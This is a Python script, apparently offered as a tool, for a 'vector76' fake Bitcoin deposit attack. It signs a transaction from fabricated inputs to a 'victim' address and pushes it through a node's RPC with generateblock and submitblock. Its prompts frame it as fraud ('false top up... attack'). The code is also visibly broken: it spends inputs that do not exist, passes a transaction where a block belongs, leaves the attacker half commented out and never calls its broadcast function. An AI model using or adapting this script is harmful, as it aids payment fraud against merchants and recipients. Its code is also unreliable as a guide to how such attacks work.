import argparse
import requests
import subprocess
import bitcoin.rpc
import bitcoin.core
import cryptos
import hashlib
import uuid
from bitcoinaddress import Wallet

parser = argparse.ArgumentParser(description="How To Use vector76")
parser.add_argument("node_host",
                    help="Blockchain Node Host",
                    type=str)
parser.add_argument("node_port",
                    help="Blockchain Node Port",
                    type=int)
parser.add_argument("username",
                    help="Your BTC node username",
                    type=str)
parser.add_argument("password",
                    help="Your BTC node password",
                    type=str)
parser.add_argument("send_to",
                    help="Fake send btc to victim address.",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units) Up to 10 BTC.",
                    type=float)

parser.add_argument("--is_testnet",
                    help="Testnet flag (Default=True)",
                    default=True,
                    type=bool)

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)

def broadcast_transaction(raw_tx, testnet):
    url = "https://blockstream.info/api/tx"
    headers = {'Content-Type': 'text/plain'}
    payload = raw_tx
    if testnet:
        url = "https://blockstream.info/testnet/api/tx"
        headers = {'Content-Type': 'text/plain'}
        payload = raw_tx

    response = requests.post(url, data=payload, headers=headers)
    print(response.text)
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")


args = parser.parse_args()
rpc_host = args.node_host
rpc_port = args.node_port
username = args.username
password = args.password

victim_address   = args.send_to
amount_btc = args.amount_of_coins
testnet    = args.is_testnet

transaction_util = cryptos.Bitcoin(testnet=testnet)
print("Connecting Public Node...")
rpc_node = bitcoin.rpc.Proxy(service_url=f"http://{username}:{password}@{rpc_host}",
                 service_port=rpc_port)
print("OK")
print()
fake_from = Wallet()

#inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))

fake_hash = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()
fake_inputs = [{'tx_hash': fake_hash,
                'tx_pos': 1,
                'height': 2870812, 
                'value': 1000000000, # = 10 BTC(Fake)
                'address': fake_from.address.mainnet.pubaddr1}]
if testnet:
    fake_inputs[0]["address"] = fake_from.address.testnet.pubaddr1

print(f"Fake Deposit Information : {fake_inputs}")
if amount_btc > 10:
    print(f"[!] Fake remittance amount exceeds 10BTC.")
    exit()

balance = fake_inputs[0]["value"]
send_amount = to_satoshi(amount_btc)
change_btc_amt = (balance - send_amount) #おつり
tx_victim = [{"address": victim_address, "value": send_amount}, {"address": fake_inputs[0]["address"], "value": change_btc_amt}]
tx_victim = transaction_util.mktx(fake_inputs, tx_victim)
tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.mainnet.wif))
if testnet:
    tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_from.key.testnet.wif))
#print(tx_victim)
#tx_attacker = [{"address": attacker_address, "value": send_amount}, {"address": change_address, "value": change_btc_amt}]
#tx_attacker = transaction_util.mktx(inputs, tx_attacker)
#tx_attacker["ins"][0]["prev_hash"] = last_txid
#tx_attacker = cryptos.serialize(transaction_util.sign(tx_attacker, 0, key))
#print()
#print(tx_attacker)
#print()
#tx_vector76 = f"{tx_attacker}{tx_victim}"
#tx_vector76 = cryptos.serialize(transaction_util.sign(tx_vector76, 0, key))
#print(tx_vector76)
print()
print("--------------------")
print(f"Fake Send to                       : {victim_address}")
print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
print(f"Signed V1 RawTx           : {tx_victim}")
print(f"Testnet Mode              : {testnet}")
print("--------------------")
print()
print()
print("[+] READY...")
print()
input(" --- Press the enter key to continue the false top up vector76 method attack... --- ")
print()
print("OK")
print("Send Fake TX...")
result = rpc_node.sendrawtransaction(tx_victim)
print(result)
print("Mining Vector76 block...")

vector76_response = None
if testnet:
    vector76_response = rpc_node.call("generateblock", fake_from.address.testnet.pubaddr1, tx_victim)
else:
    vector76_response = rpc_node.call("generateblock", fake_from.address.mainnet.pubaddr1, tx_victim)

print(vector76_response)
input("--- Send the block after pressing the enter key. --- ")
print("Index > 強固なブロックチェーンに対して強制干渉を開始...")
print()
result = rpc_node.submitblock(tx_victim)
print()
print("SND ITX TOBC  (ブロックチェーンへ不正なトランザクションを送信!)")
print(result)
print()
#ゴリ押し
result = rpc_node.submitblock(vector76_response)  #ゴリ押し
print()
#おまけ
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()

sound_name = "ImagineBreaker.mp3"
try:
    import soundplay
    soundplay.playsound(sound_name)
except:
    # Termux Only
    imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
    subprocess.run(imagine_breaker_cmd)

print("Done.")
